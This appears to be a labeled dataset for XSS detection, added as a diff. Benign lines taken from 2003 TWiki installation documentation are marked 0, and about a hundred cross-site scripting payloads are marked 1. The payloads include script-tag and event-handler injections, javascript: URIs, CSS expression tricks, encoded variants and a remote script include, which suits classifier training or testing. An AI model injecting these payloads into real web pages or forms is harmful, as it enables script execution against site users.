@@ -1,0 +1,200 @@
+<title>TWikiDocumentation</title>	0
+</head><body bgcolor="#ffffff">	0
+<h1><a name="Feb_2">(01 Feb 2003)</a></h1>	0
+<script language="JavaScript" type="text/javascript">	0
+<!-- TWiki -->	0
+<strong><em>Doubleclick</em></strong>	0
+<a href="#TWiki">TWiki System Requirements</a>	0
+<a href="#Server_Requirements">Server Requirements</a>	0
+<strong><em>Note:</em></strong><a href="" target="_top"></a>	0
+<strong><em>Related Topics:</em></strong> <a href="http://TWiki.org">TWikiSite</a>	0
+<h1><a name="TWiki_System_Requirements"> TWiki System Requirements </a></h1>	0
+<em>Server and client requirements for TWiki 01-Feb-2003</em>	0
+<h2><a name="Server_Requirements"> Server Requirements </a></h2>	0
+<a href="http://www.gnu.org" target="_top">RCS</a>	0
+<table border="1" cellspacing="0" cellpadding="1"> <tr><th colspan="3" bgcolor="#99CCCC"></th></tr>	0
+<tr><th bgcolor="#99CCCC"> <strong>Resource</strong> </th><th bgcolor="#99CCCC">	0
+<tr><td> Perl </td><td colspan="2" align="center"><br />	0
+<tr><td></td><td align="center"> <code>Net::SMTP</code></td></tr>	0
+<tr><td> RCS </td><td colspan="2" align="center"><br />	0
+<tr><td> GNU <code>diff</code> </td><td colspan="2" align="center"> GNU <code>diff</code><br />	0
+<tr><td></td><td colspan="2" align="center"> <code>ls, fgrep, egrep</code> </td></tr>	0
+<tr><td></td><td align="center"> <code>cron</code> </td><td> <code>cron</code></td></tr>	0
+<tr><td> Web server </td><td colspan="2" align="center"> Apache</td></tr>	0
+<img src="http://TWiki.org" border="0" alt="ALERT!" width="16" height="16" />	0
+<a name="ClientRequirements"></a>	0
+<h2><a name="Client_Requirements"> Client Requirements </a></h2>	0
+The TWiki <a href="http://TWiki.org">standard installation</a>	0
+You can easily add functionality, by customizing <a href="http://TWiki.org">TWikiTemplates</a>	0
+<h2><a name="Known_Issues"> Known Issues </a></h2>	0
+-- <a href="http://TWiki.org/cgi-bin/">MikeMannix</a>	0
+<h1><a name="TWiki_Installation_Guide"> TWiki Installation Guide </a></h1>	0
+<em>Installation instructions for the TWiki 01-Feb-2003 production release. Update notes for the new RCS configuration are marked</em>	0
+These installation steps are based on the <strong>Apache</strong> web server on <strong>Linux</strong>	0
+<a name="StandardInstallation"></a>	0
+<h2><a name="Standard_Installation"> Standard Installation </a></h2>	0
+Request and download the TWiki<a href="http://TWiki.org/download.html" target="_top">http://TWiki.org/download.html</a>	0
+<h3><a name="Step_1_Create_Configure_the_Dire"> Step 1: Create</a></h3>	0
+<img src="http://TWiki.org/p/pub/TWiki/TWikiDocGraphics/warning.gif" border="0" alt="ALERT!" width="16" height="16" />	0
+<br /> <img src="http://TWiki.org/p/pub/TWiki/TWikiDocGraphics/warning.gif" border="0" alt="ALERT!" width="16" height="16" />	0
+<blockquote style="background-color:#F5F5F5">	0
+<strong>Example <code>httpd.conf</code> entries:</strong>	0
+<pre> ScriptAlias /twiki/bin/ "/home/httpd/twiki/bin/"	0
+&lt;/Directory&gt;</pre>	0
+<em>Go directly to <a href="#StepTwo">Step 2</a>...</em>	0
+<a name="StepOneB"></a>	0
+<h4><a name="Step_1_for_Non_Root_Accounts"> Step 1 for Non-Root Accounts </a></h4>	0
+<table border="1" cellspacing="0" cellpadding="1"> <tr><th bgcolor="#99CCCC"> <strong>TWiki dir:</strong> </th><th bgcolor="#99CCCC">	0
+<tr><td> <code>twiki</code> </td><td> start-up pages </td><td> root TWiki dir </td><td> <code>/home/smith/twiki/</code> </td></tr>	0
+<tr><td> <code>twiki/bin</code> </td><td> CGI bin </td><td> CGI-enabled dir </td><td> <code>/home/smith/twiki/bin</code> </td></tr>	0
+<tr><td> <code>twiki/lib</code> </td><td> library files </td><td> same level as <code>twiki/bin</code> </td><td> <code>/home/smith/twiki/lib</code> </td></tr>	0
+<tr><td> <code>twiki/pub</code> </td><td> public files </td><td> htdoc enabled dir </td><td> <code>/home/smith/twiki/pub</code> </td></tr>	0
+<tr><td> <code>twiki/data</code> </td><td> topic data </td><td> dir secure from public access </td><td> <code>/home/smith/twiki/data</code> </td></tr>	0
+<tr><td> <code>twiki/templates</code> </td><td> web templates </td><td> dir secure from public access </td><td> <code>/home/smith/twiki/templates</code> </td></tr>	0
+If you are not able to create the <code>twiki/lib</code> directory at the same level as the <code>twiki/bin</code>	0
+twikiLibPath = <font color="red">'/some/other/path/lib'</font>; # Path to lib directory containing TWiki.pm	0
+You can also edit <code>localPerlLibPath</code> in the <code>setlib.cfg</code>	0
+<a name="StepTwo"></a>	0
+<h3><a name="Step_2_Set_File_Permissions"> Step 2: Set File Permissions </a></h3>	0
+<strong>IMPORTANT:</strong> On ISP-hosted accounts, Perl CGI scripts usually require a <code>.cgi</code>	0
+<img src="http://TWiki.org/p/pub/TWiki/TWikiDocGraphics/help.gif" border="0" alt="HELP" width="16" height="16" />	0
+<img src="http://TWiki.org/p/pub/TWiki/TWikiDocGraphics/tip.gif" border="0" alt="TIP" width="16" height="16" />	0
+<img src="http://TWiki.org/p/pub/TWiki/TWikiDocGraphics/help.gif" border="0" alt="HELP" width="16" height="16" />	0
+<h3><a name="Step_3_Set_the_Main_Configuratio"> Step 3: Set the Main Configuration File </a></h3>	0
+<strong>Security issue:</strong> Directories <code>twiki/data</code> , <code>twiki/templates</code>	0
+<h3><a name="Step_4_Configure_Site_Wide_Email"> Step 4: Configure Site-Wide Email Preferences </a></h3>	0
+<code>WIKIWEBMASTER</code> should be set to the email address of the TWiki administrator	0
+<code>SMTPMAILHOST</code> is typically set on Windows or other non-Unix/Linux systems, where <code>sendmail</code>	0
+<code>SMTPSENDERHOST</code> is optional, and set to the domain name sending the email (e.g. <code>twiki.yourdomain.com</code>).	0
+<h3><a name="Step_5_Finish_Up_from_Your_Brows"> Step 5: Finish Up from Your Browser </a></h3>	0
+<img src="http://TWiki.org/p/pub/TWiki/TWikiDocGraphics/tip.gif" border="0" alt="TIP" width="16" height="16" />	0
+<h2><a name="Additional_Server_Level_Options"> Additional Server-Level Options </a></h2>	0
+<a name="AuthenticationOfUsers"></a>	0
+<h3><a name="Enabling_Authentication_of_Users"> Enabling Authentication of Users </a></h3>	0
+<strong>Rename</strong> file <code>.htaccess.txt</code> in the <code>twiki/bin</code> directory to <code>.htaccess</code>	0
+<code>Redirect <font color="red">/urlpathto/twiki/index.html</font> http://<font color="red">yourdomain.com/urlpathto/twiki/bin/</font>view</code> <br>	0
+<code>AuthUserFile <font color="red">/filepathto/twiki/data/</font>.htpasswd</code> <br />	0
+<code>ErrorDocument 401 <font color="red">/urlpathto/twiki/bin/</font>oops/TWiki/TWiki</code>	0
+<img src="http://TWiki.org/p/pub/TWiki/TWikiDocGraphics/warning.gif" border="0" alt="ALERT!" width="16" height="16" />	0
+<img src="http://TWiki.org/p/pub/TWiki/TWikiDocGraphics/help.gif" border="0" alt="HELP" width="16" height="16" />	0
+<strong>This applies only if you have root access:</strong> on hosted accounts, you shouldn't have this problem - otherwise, email tech support.	0
+<img src="http://TWiki.org/p/pub/TWiki/TWikiDocGraphics/warning.gif" border="0" alt="ALERT!" width="16" height="16" />	0
+<strong>Copy</strong> the <a href="http://TWiki.org/cgi-bin/view/TWiki/TWikiRegistrationPub">TWikiRegistrationPub</a>	0
+<img src="http://TWiki.org/p/pub/TWiki/TWikiDocGraphics/warning.gif" border="0" alt="ALERT!" width="16" height="16" />	0
+<img src="http://TWiki.org/p/pub/TWiki/TWikiDocGraphics/warning.gif" border="0" alt="ALERT!" width="16" height="16" />	0
+<h2><a name="TWiki_File_System_Info"> TWiki File System Info </a></h2>	0
+See <a href="http://TWiki.org/cgi-bin/view/TWiki/AppendixFileSystem">Appendix A: TWiki File System</a>	0
+-- <a href="http://TWiki.org/cgi-bin/view/TWiki/PeterThoeny">PeterThoeny</a> - 28 Dec 2002 <br />	0
+-- <a href="http://TWiki.org/cgi-bin/view/Main/MikeMannix">MikeMannix</a> - 16 May 2002	0
+<h1><a name="Windows_Install_Cookbook"> Windows Install Cookbook </a></h1>	0
+<h2><a name="Introduction"> Introduction </a></h2>	0
+This cookbook is intended to get you up and running with TWiki on Windows quickly, with as few problems as possible. The 'cookbook' approach is simply to restrict the many choices that someone installing	0
+TWiki must make, so that a reasonably well-defined procedure can be followed - new users can simply follow the steps, while experts can use this as more of a guideline. Please read	0
+<a href="http://twiki.org/cgi-bin/view/Codev.WindowsModPerlInstallCookbook" title="'Codev.WindowsModPerlInstallCookbook' on TWiki site, we know it!">TWiki:Codev.WindowsModPerlInstallCookbook</a> in case you use mod_perl.	0
+-- <a href="http://TWiki.org/cgi-bin/view/Main/RichardDonkin">RichardDonkin</a> - 24 Feb 2002	0
+<h2><a name="Recent_updates"> Recent updates </a></h2>	0
+30 Nov 2002 - added <code>binutils</code> to list of Cygwin packages, and added warning not to use Apache 2.0	0
+20 Nov 2002 - update to avoid <a href="http://twiki.org/cgi-bin/view/Support.InstallDigestSHA1Fails" title="'Support.InstallDigestSHA1Fails' on TWiki site, we know it!">SHA1Fails</a>	0
+12 Nov 2002 - setting <code>SMTPMAILHOST</code> for user registration and notification	0
+03 Sep 2002 - linked to <a href="http://twiki.org/cgi-bin/view/Codev.WindowsModPerlInstallCookbook" title="'Codev.WindowsModPerlInstallCookbook' on TWiki site, we know it!">Codev</a>	0
+20 Jul 2002 - added flags to <code>grep</code> commands in <code>TWiki.cfg</code>	0
+ ' onerror=alert(1);'	1
+ ' onerror=alert`1`;'	1
+ '; alert(1); //	1
+ '; alert`1`; //	1
+ ';\r\nalert(1);//	1
+ ';\r\nalert`1`;//	1
+ onerror=alert(1);	1
+ onmousemove=alert(1); 	1
+--><script>alert(1);</script>	1
+--><script>alert`1`;</script>	1
+;}alert(1);{&#39;	1
+" /><frame src="javascript:alert(1);"></frameset>	1
+" onerror=alert(1);"	1
+" onerror=alert`1`;"	1
+" onmousemove=alert(1); 	1
+" onmousemove=alert(1);"	1
+" onmousemove=alert`1`; 	1
+" onmousemove=alert`1`;"	1
+"; alert(1); //	1
+"; alert`1`; //	1
+";\r\nalert(1);//	1
+";\r\nalert`1`;//	1
+""" style="background:url(javascript:alert(1))" "	1
+<img src=javascript:alert(1)>	1
+"<s>"><img src="javascript:alert(1)">	1
+"<s>"><script>alert(1)</script>	1
+"></iframe><script>alert(1);</script>	1
+"></iframe><script>alert`1`;</script>	1
+"><frame src="javascript:alert(1)">	1
+"><frame src="javascript:alert`1`">	1
+"><script>alert(1);</script>	1
+"><script>alert`1`;</script>	1
+"onclick="alert(1)"	1
+"onclick="alert`1`"	1
+"onclick="alert(1)" "onFocus="alert(1)"	1
+"onclick="alert`1`" "onFocus="alert`1`"	1
+"onFocus="alert(1)"	1
+"onFocusOut="alert(1)"	1
+"onMouseDown="alert(1)"	1
+"onMouseEnter="alert(1)"	1
+"onMouseEnter="alert(1)" "onMouseDown="alert(1)"	1
+"onMouseLeave="alert(1)"	1
+"onMouseLeave="alert(1)" "onMouseOut="alert(1)"	1
+"onMouseMove="alert(1)"	1
+"onMouseMove="alert(1)" "onFocusOut="alert(1)"	1
+"onMouseOut="alert(1)"	1
+"onMouseUp="alert(1)"	1
+"onMouseWheel="alert(1)"	1
+"onMouseWheel="alert(1)" "onMouseUp="alert(1)"	1
+”＞＜ｓｃｒｉｐｔ＞ａｌｅｒｔ（’ＸＳＳ’）＜／ｓｃｒｉｐｔ＞	1
+*/\r\nalert(1);//	1
+*/\r\nalert`1`;//	1
+\r\nalert(1);//	1
+\r\nalert`1`;//	1
+<![CDATA["><script>alert(1)</script><!--]]>	1
+</textarea><img src=x onerror=alert(1);>	1
+</textarea><img src=x onerror=alert`1`;>	1
+</textarea><script>alert(1);</script>	1
+</textarea><script>alert`1`;</script>	1
+<% onmousemove=alert(1)>	1
+<% style="xss:expr/* */ession(alert(1))">	1
+<% style="xss:expression(alert(1))">	1
+<<script>alert(1);<</script>	1
+<a onmouseover="alert(1)">XSS</a>	1
+<a onmouseover=alert(1)>XSS</a>	1
+<b <script>alert(1)</script>0	1
+<b>aaaa<script<b></b><alert(1)</script </b>	1
+<div style='behavior:url(test.sct)'>a</div>	1
+<div style="color:expression(alert(1));">a</div>	1
+<div style="left:exp/* */ression(alert(1))">	1
+<div style="left:expression(alert(1))">	1
+<div/style="width:expression(alert(1))">x</div>	1
+<iframe src="data:text/html,<script>alert(1)</script>"></iframe>	1
+<iframe src="javascript:alert(1);"></iframe>	1
+<iframe src="x" style=width:exp/**/ressi/**/on(alert(1))>	1
+<iframe src=# onmouseover="alert(1)"></iframe>	1
+<img src="http://www.example.com/>"onerror="alert(1)//<">	1
+<img src=x onerror=alert(1);>	1
+<img src=x onerror=alert`1`;>	1
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-7"/>+ADw-script+AD4-alert(1)+ADsAPA-/script+AD4-	1
+<object data="data:text/html,<script>alert(1)</script>"></object>	1
+<q/oncopy=alert(1)	1
+<q/oncut=alert(1)	1
+<s oncopy= alert(1)>a	1
+<s oncut= alert(1)>a	1
+<s><script>alert(1)</script>	1
+<s>><img src="javascript:alert(1)>	1
+<script src=http://example.com/xss.js></script>	1
+<sCriPt src=http://example.com/xss.js></script>	1
+<script>alert(1);</script>	1
+<ScrIpt>alert(1);</SCript>	1
+<script>alert`1`;</script>	1
+<SELECT NAME="" onmouseover=alert(1)></select>	1
+><s><img src="javascript:alert(1)>	1
+a style=background:url(javascript:alert(1)) 	1
+data:text/html,<script>alert(1)</script>	1
+javascript:alert(1);	1
+javascript:alert(1)//	1
+javascript:alert`1`;	1
+style=background:url(javascript(1))	1
